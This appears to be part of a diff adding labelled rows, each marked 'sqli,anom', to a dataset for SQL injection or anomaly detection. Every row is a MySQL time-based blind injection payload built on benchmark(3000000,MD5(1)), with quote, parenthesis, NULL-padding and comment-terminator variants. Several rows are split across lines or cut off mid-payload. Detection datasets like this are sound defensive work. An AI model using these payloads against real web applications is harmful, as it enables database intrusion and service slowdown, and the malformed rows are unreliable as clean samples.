+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20--",sqli,anom
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20%23",sqli,anom
+"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20/*",sqli,anom
+"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20--",sqli,anom
+"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20%23",sqli,anom
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20/*
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20--",sqli,anom
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20%23
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20/*
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20--
++if(benchmark(3000000,MD5",sqli,anom
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20--
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20%23",sqli,anom
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*",sqli,anom
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--",sqli,anom
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23",sqli,anom
+"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*",sqli,anom
+"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--",sqli,anom
+"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23",sqli,anom
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--",sqli,anom
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%2",sqli,anom
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23",sqli,anom
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*",sqli,anom
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--",sqli,anom
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23",sqli,anom
+"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*",sqli,anom
+"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--",sqli,anom
+"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23",sqli,anom
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--",sqli,anom
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23
+,(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*
+,(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1)",sqli,anom
+",(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--
+,(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23",sqli,anom
+"),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*",sqli,anom
+"),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--",sqli,anom
+"),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23",sqli,anom
+"'),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*",sqli,anom
+"'),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--",sqli,anom
+"'),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23",sqli,anom
+"),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*
+),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--",sqli,anom
+"),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23
+and 0=benchmark(3000000,MD5(1))%20/*
+ and 0=benchmark(3000000,MD5(1))%20--
+ and 0=benchmark(3000000,MD5(1))%20%23
+' and 0=benchmark(3000000,MD5(1))%20/*
+' and 0=benchmark(3000000,MD5(1))%20--
+' and 0=benchmark(3000000,MD5(1))%20%23
+ and 0=benchmark(3000000,MD5(1))%20/*",sqli,anom
+" and 0=benchmark(3000000,MD5(1))%20--
+ and 0=benchmark(3000000,MD5(1))%20%23",sqli,anom
+") and 0=benchmark(3000000,MD5(1))%20/*",sqli,anom
+") and 0=benchmark(3000000,MD5(1))%20--",sqli,anom
+") and 0=benchmark(3000000,MD5(1))%20%23",sqli,anom
+")) and 0=benchmark(3000000,MD5(1))%20/*",sqli,anom
+")) and 0=benchmark(3000000,MD5(1))%20--",sqli,anom
+")) and 0=benchmark(3000000,MD5(1))%20%23",sqli,anom
+"))) and 0=benchmark(3000000,MD5(1))%20/*",sqli,anom
+"))) and 0=benchmark(3000000,MD5(1))%20--",sqli,anom
+"))) and 0=benchmark(3000000,MD5(1))%20%23",sqli,anom
+")))) and 0=benchmark(3000000,MD5(1))%20/*",sqli,anom
+")))) and 0=benchmark(3000000,MD5(1))%20--",sqli,anom
+")))) and 0=benchmark(3000000,MD5(1))%20%23",sqli,anom
+"') and 0=benchmark(3000000,MD5(1))%20/*",sqli,anom
+"') and 0=benchmark(3000000,MD5(1))%20--",sqli,anom
+"') and 0=benchmark(3000000,MD5(1))%20%23",sqli,anom
+") and 0=benchmark(3000000,MD5(1))%20/*
+) and 0=benchmark(3000000,MD5(1))%20--",sqli,anom
+") and 0=benchmark(3000000,MD5(1))%20%23
+')) and 0=benchmark(3000000,MD5(1))%20/*
+')) and 0=benchmark(3000000,MD5(1))%20--
+')) and 0=benchmark(3000000,MD5(1))%20%23
+)) and 0=benchmark(3000000,MD5(1))%20/*",sqli,anom
+")) and 0=benchmark(3000000,MD5(1))%20--
+)) and 0=benchmark(3000000,MD5(1))%20%23",sqli,anom
+"'))) and 0=benchmark(3000000,MD5(1))%20/*",sqli,anom
+"'))) and 0=benchmark(3000000,MD5(1))%20--",sqli,anom
+"'))) and 0=benchmark(3000000,MD5(1))%20%23",sqli,anom
+"))) and 0=benchmark(3000000,MD5(1))%20/*
+))) and 0=benchmark(3000000,MD5(1))%20--",sqli,anom
+"))) and 0=benchmark(3000000,MD5(1))%20%23
+')))) and 0=benchmark(3000000,MD5(1))%20/*
+')))) and 0=benchmark(3000000,MD5(1))%20--
+')))) and 0=benchmark(3000000,MD5(1))%20%23
+)))) and 0=benchmark(3000000,MD5(1))%20/*",sqli,anom
+")))) and 0=benchmark(3000000,MD5(1))%20--
+)))) and 0=benchmark(3000000,MD5(1))%20%23",sqli,anom
